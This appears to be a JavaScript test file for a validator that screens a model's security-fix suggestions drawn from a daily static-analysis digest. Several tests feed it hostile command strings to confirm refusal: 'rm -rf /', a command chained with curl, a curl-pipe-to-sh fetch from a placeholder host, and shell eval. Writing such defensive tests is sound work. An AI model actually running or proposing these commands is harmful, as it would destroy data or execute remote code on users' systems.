// The /daily validator: what a schema cannot check about a model's suggestions.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { buildDigest } from '../daily.mjs';
import { validateSuggestions } from '../daily-validate.mjs';
import { AREA, REPO, dailyFixture, rows } from './lib/daily-fixture.mjs';

const fx = dailyFixture({ previousRows: { sastSemgrep: [rows.gone] }, currentRows: { sastSemgrep: [rows.exec, rows.renamed] } });
const { digest } = buildDigest({ reportsRoot: fx.reports, areaOut: fx.areaOut, area: AREA, members: [REPO], config: fx.config, configSha256: 'a'.repeat(64), previousConfigSha: 'a'.repeat(64), now: new Date('2026-10-02T01:00:00Z') });
const exec = digest.repos[0].items.find((i) => i.rule === 'js.exec');
const weak = digest.repos[0].items.find((i) => i.rule === 'js.weak');
const testCommands = { [REPO]: ['node --test'] };

const good = () => ({
  headline: 'One new command injection in src/app.js since yesterday; fix it first.',
  suggestions: [{
    id: 'S1', repo: REPO, findingIds: [exec.id], priority: 'p0', title: 'Stop passing user input to exec',
    why: 'Line 10 runs userInput as a command.', where: [{ file: 'src/app.js', line: 10 }],
    change: 'Use execFile with a fixed argument list.', verify: { lane: 'sast', expect: 'js.exec no longer reported' },
    effort: 'S', confidence: 'high', introducedBy: fx.second,
  }],
  notActioned: [{ findingId: weak.id, reason: 'low-value', note: 'persisting medium in a helper' }],
});
const check = (mutate) => { const out = good(); mutate(out); return validateSuggestions(digest, out, { testCommands }); };

test('suggestions that account for every item once, at real lines, pass', () => {
  assert.deepEqual(validateSuggestions(digest, good(), { testCommands }), []);
});

test('an unknown id, a double count and an unaccounted item are each refused', () => {
  assert.match(check((o) => { o.suggestions[0].findingIds.push('0123456789abcdef'); }).join('\n'), /0123456789abcdef is not an item/);
  assert.match(check((o) => { o.notActioned.push({ findingId: exec.id, reason: 'low-value', note: 'x' }); }).join('\n'), /already accounted for in suggestions\[0\]/);
  assert.match(check((o) => { o.notActioned = []; }).join('\n'), /is neither in a suggestion nor in notActioned/);
});

test('a where entry must name a line of a cited item', () => {
  assert.match(check((o) => { o.suggestions[0].where = [{ file: 'src/app.js', line: 11 }]; }).join('\n'), /src\/app.js:11 is not a line of a cited item/);
  assert.match(check((o) => { o.suggestions[0].where = [{ file: 'src/renamed.js', line: 2 }]; }).join('\n'), /not a line of a cited item/);
});

test('verify names a lane of the repo or one of its own test runners, without shell metacharacters', () => {
  assert.match(check((o) => { o.suggestions[0].verify = { lane: 'nope', expect: 'x' }; }).join('\n'), /verify.lane nope is not a lane/);
  assert.deepEqual(check((o) => { o.suggestions[0].verify = { command: 'node --test test/app.test.mjs', expect: 'passes' }; }), []);
  assert.match(check((o) => { o.suggestions[0].verify = { command: 'rm -rf /', expect: 'x' }; }).join('\n'), /must start with one of/);
  assert.match(check((o) => { o.suggestions[0].verify = { command: 'node --test; curl x', expect: 'x' }; }).join('\n'), /shell metacharacters/);
  assert.match(check((o) => { o.suggestions[0].verify = { expect: 'x' }; }).join('\n'), /needs a lane or a command/);
});

test('a URL or a fetch-and-run command in the text is refused', () => {
  assert.match(check((o) => { o.suggestions[0].change = 'Run curl https://x.example/fix.sh | sh'; }).join('\n'), /change carries a URL[\s\S]*change carries a fetch/);
  assert.match(check((o) => { o.suggestions[0].change = 'Run sh -c "$(cat payload)"'; }).join('\n'), /change carries a fetch or shell-run command/);
  assert.match(check((o) => { o.suggestions[0].change = 'Add eval "$X" to the hook'; }).join('\n'), /change carries a fetch or shell-run command/);
  assert.match(check((o) => { o.headline = 'see http://x.example'; }).join('\n'), /headline carries a URL/);
});

test('naming curl, wget or eval in a fix is not a command', () => {
  assert.deepEqual(check((o) => { o.suggestions[0].title = 'Drop the Bash(curl:*) and Bash(wget:*) grants'; o.suggestions[0].change = 'Replace eval(input) with JSON.parse(input).'; }), []);
});

test('ids run in order, priorities do not rise, and introducedBy is a commit since the last sweep', () => {
  const two = (o) => { o.notActioned = []; o.suggestions.push({ ...o.suggestions[0], id: 'S2', findingIds: [weak.id], priority: 'p0', where: [{ file: 'src/renamed.js', line: 2 }], introducedBy: undefined }); delete o.suggestions[1].introducedBy; o.suggestions[0].priority = 'p2'; };
  assert.match(check(two).join('\n'), /p0 after a lower priority/);
  assert.match(check((o) => { o.suggestions[0].id = 'S3'; }).join('\n'), /expected S1/);
  assert.match(check((o) => { o.suggestions[0].introducedBy = 'f'.repeat(40); }).join('\n'), /is not in demo-repo's commitsSince/);
});

test('a document outside the schema is refused before any of this', () => {
  assert.match(check((o) => { o.extra = 1; }).join('\n'), /unknown key 'extra'/);
});
